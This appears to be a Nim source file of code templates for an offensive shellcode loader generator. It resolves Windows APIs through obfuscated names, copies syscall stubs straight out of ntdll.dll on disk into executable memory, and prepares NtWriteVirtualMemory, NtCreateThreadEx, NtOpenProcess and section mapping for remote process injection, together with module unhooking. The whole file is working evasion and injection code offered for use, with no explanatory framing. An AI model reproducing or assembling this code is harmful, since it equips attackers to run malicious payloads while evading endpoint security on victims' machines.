
let DInvokeBaseStub * = """

const
  KERNEL32_DLL* = obf("kernel32.dll")

type
  #GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
  #GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
  VirtualAllocEx_t* = proc (hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
  VirtualProtect_t* = proc (lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}

const
  #GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
  VirtualAllocEx_HASH * = obf("VirtualAllocEx")
  #GetCurrentProcess_HASH * = obf("GetCurrentProcess")
  OpenProcess_HASH * = obf("OpenProcess")
  VirtualProtect_HASH * = obf("VirtualProtect")

#var MyGetCurrentProcess*: GetCurrentProcess_t
var MyVirtualAllocEx*: VirtualAllocEx_t
#var MyGetCurrentProcessId*: GetCurrentProcessId_t
var MyOpenProcess*: OpenProcess_t
var MyVirtualProtect*: VirtualProtect_t

#MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))

#MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))

MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))

MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
"""

let DInvokeLoadLibraryAGetProcAddress * = """

    type
      LoadLibraryA_t = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
      GetProcAddress_t = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
      
    const
      LoadLibraryA_HASH  = obf("LoadLibraryA")
      GetProcAddress_HASH  = obf("GetProcAddress")
      
    var MyLoadLibraryA: LoadLibraryA_t
    var MyGetProcAddress: GetProcAddress_t

    MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))

    MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))



"""

let GetSyscallStub * = """

when defined(GetSyscallStub):
    type
      PS_ATTR_UNION* {.pure, union.} = object
        Value*: ULONG
        ValuePtr*: PVOID
      PS_ATTRIBUTE* {.pure.} = object
        Attribute*: ULONG 
        Size*: SIZE_T
        u1*: PS_ATTR_UNION
        ReturnLength*: PSIZE_T
      PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
      PS_ATTRIBUTE_LIST* {.pure.} = object
        TotalLength*: SIZE_T
        Attributes*: array[2, PS_ATTRIBUTE]
      PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
      KNORMAL_ROUTINE* {.pure.} = object
        NormalContext*: PVOID
        SystemArgument1*: PVOID
        SystemArgument2*: PVOID
      PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
    
    var 
        SYSCALL_STUB_SIZE: int = 23

    # Unmanaged NTDLL Declarations

    type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
    var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}

    type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}

    var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}

    type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

    var NtCreateThreadEx: myNtCreateThreadEx

    type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
    
    type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
    
    var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

    type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

    var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

    type myNtCreateSection = proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}

    var NtCreateSection: proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}

    type myNtMapViewOfSection = proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}

    var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}


    
    type
      CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
      GetFileSize_t* = proc (hFile: HANDLE, lpFileSizeHigh: LPDWORD): DWORD {.stdcall.}
      RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
      GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
      ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
      
    const
      CreateFileA_HASH * = obf("CreateFileA")
      GetFileSize_HASH * = obf("GetFileSize")
      RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
      GetProcessHeap_HASH * = obf("GetProcessHeap")
      ReadFile_HASH * = obf("ReadFile")
    when defined(DInvoke):  
        var MyCreateFileA*: CreateFileA_t
        var MyGetFileSize*: GetFileSize_t
        var MyRtlAllocateHeap*: RtlAllocateHeap_t
        var MyGetProcessHeap*: GetProcessHeap_t
        var MyReadFile*: ReadFile_t
    
    when defined(DInvoke):
        MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
        MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
        MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
        MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
        MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))
    
    proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
        return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
    
    proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
        var
            file: HANDLE
            fileSize: DWORD
            bytesRead: DWORD
            fileData: PVOID
            ntdllString: LPCSTR
            nullHandle: HANDLE
        when defined(wow64):
            ntdllString = obf("C:\\windows\\syswow64\\ntdll.dll")
        else:
            ntdllString = obf("C:\\windows\\system32\\ntdll.dll")
        when defined(DInvoke):
            file = MyCreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
            fileSize = MyGetFileSize(file, nil)
            fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
            let success = MyReadFile(file, fileData, fileSize, addr bytesRead, nil)
        else:
            file = CreateFileA(ntdllString, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullHandle)
            fileSize = GetFileSize(file, nil)
            fileData = RtlAllocateHeap(cast[PVOID](GetProcessHeap()), 0, cast[SIZE_T](fileSize))
            let success = ReadFile(file, fileData, fileSize, addr bytesRead, nil)
        var
            dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
            imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
            exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
            section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
            textSection: PIMAGE_SECTION_HEADER = section
            rdataSection: PIMAGE_SECTION_HEADER = section
    
        let low: uint16 = 0
    
        for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
            var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
            if obf(".rdata") in toString(ntdllSectionHeader.Name):
                rdataSection = ntdllSectionHeader
            
        var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))
    
        var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
        var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
        var stubFound: BOOL = 0
        var oldProtection: DWORD = 0
        let low2: int = 0
        for low2 in 0 ..< exportDirectory.NumberOfNames:
            var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
            var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
            var functionNameResolved: cstring = cast[cstring](functionNameVA)
            if (functionNameResolved == functionName):
                moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
                stubFound = 1
        return stubFound

"""


let RetrieveSyscallStubs * = """


    var hProcess: HANDLE
    when defined(DInvoke):
        hProcess = -1

        var pHandle2: HANDLE = -1
        var syscallStub_NtProtect: LPVOID

        MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
        syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    else:
        hProcess = -1
        var pHandle2: HANDLE = -1
        var syscallStub_NtProtect: LPVOID
        syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (2 * cast[HANDLE](SYSCALL_STUB_SIZE))
    
    var oldProtection: DWORD = 0
    
    # Define NtProtectVirtualMemory
    NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
    when defined(DInvoke):
        var syssuccess = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        var syssuccess = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    # define NtWriteVirtualMemory
    NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
    when defined(DInvoke):
        syssuccess = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        syssuccess = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    
    # define NtAllocateVirtualMemory
    NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
    when defined(DInvoke):
        syssuccess = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        syssuccess = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    
    
    
    syssuccess = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtProtectVirtualMemory: ") & $syssuccess
    syssuccess = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtWriteVirtualMemory: ") & $syssuccess
    syssuccess = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtAllocateVirtualMemory: ") & $syssuccess
    
    var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (7 * cast[HANDLE](SYSCALL_STUB_SIZE))
    # define NtClose
    NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
    syssuccess = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtClose: ") & $syssuccess

    when defined(LocalCreateThread):
        var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
        NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
        syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess
    
    when defined(remoteMapSection):
        var syscallStub_NtCreateSection: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (4 * cast[HANDLE](SYSCALL_STUB_SIZE))
        var syscallStub_NtMapViewOfSection: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (5 * cast[HANDLE](SYSCALL_STUB_SIZE))
        # define NtCreateSection
        NtCreateSection = cast[myNtCreateSection](cast[LPVOID](syscallStub_NtCreateSection))
        syssuccess = GetSyscallStub(obf("NtCreateSection"), cast[LPVOID](syscallStub_NtCreateSection))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtCreateSection: ") & $syssuccess

        # define NtMapViewOfSection
        NtMapViewOfSection = cast[myNtMapViewOfSection](cast[LPVOID](syscallStub_NtMapViewOfSection))
        syssuccess = GetSyscallStub(obf("NtMapViewOfSection"), cast[LPVOID](syscallStub_NtMapViewOfSection))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtMapViewOfSection: ") & $syssuccess



    when defined(remoteinject):
        var syscallStub_NtOpenP: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (6 * cast[HANDLE](SYSCALL_STUB_SIZE))
        # define NtOpenProcess
        var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
        VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        
        syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtOpenProcess: ") & $syssuccess

        var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
        NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
        syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess


    

"""

let DInvokeUnhookStubs * = """

    const
      PSAPI_DLL = obf("psapi.dll")

    type
      MODULEINFO {.pure.} = object
        lpBaseOfDll: LPVOID
        SizeOfImage: DWORD
        EntryPoint: LPVOID
      LPMODULEINFO = ptr MODULEINFO

    type
      GetModuleHandleA_t = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
      GetModuleInformation_t = proc(hProcess: HANDLE, hModule: HMODULE, lpmodinfo: LPMODULEINFO, cb: DWORD): WINBOOL {.stdcall.}
      CreateFileMappingA_t = proc(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.stdcall.}
      MapViewOfFile_t = proc(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.stdcall.}
      FreeLibrary_t = proc(hLibModule: HMODULE): WINBOOL {.stdcall.}

    const
      GetModuleHandleA_HASH  = obf("GetModuleHandleA")
      GetModuleInformation_HASH  = obf("GetModuleInformation")
      CreateFileMappingA_HASH  = obf("CreateFileMappingA")
      MapViewOfFile_HASH  = obf("MapViewOfFile")
      FreeLibrary_HASH  = obf("FreeLibrary")

    var MyGetModuleHandleA: GetModuleHandleA_t
    var MyGetModuleInformation: GetModuleInformation_t
    var MyCreateFileMappingA: CreateFileMappingA_t
    var MyMapViewOfFile: MapViewOfFile_t
    var MyFreeLibrary: FreeLibrary_t

    MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))

    MyGetModuleInformation = cast[GetModuleInformation_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(PSAPI_DLL, TRUE)), GetModuleInformation_HASH, 0, FALSE)))

    MyCreateFileMappingA = cast[CreateFileMappingA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileMappingA_HASH, 0, FALSE))

    MyMapViewOfFile = cast[MapViewOfFile_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MapViewOfFile_HASH, 0, FALSE))

    MyFreeLibrary = cast[FreeLibrary_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), FreeLibrary_HASH, 0, FALSE))
"""

let SyscallStubSizeStub * = """
var 
    SYSCALL_STUB_SIZE: int = 23
"""
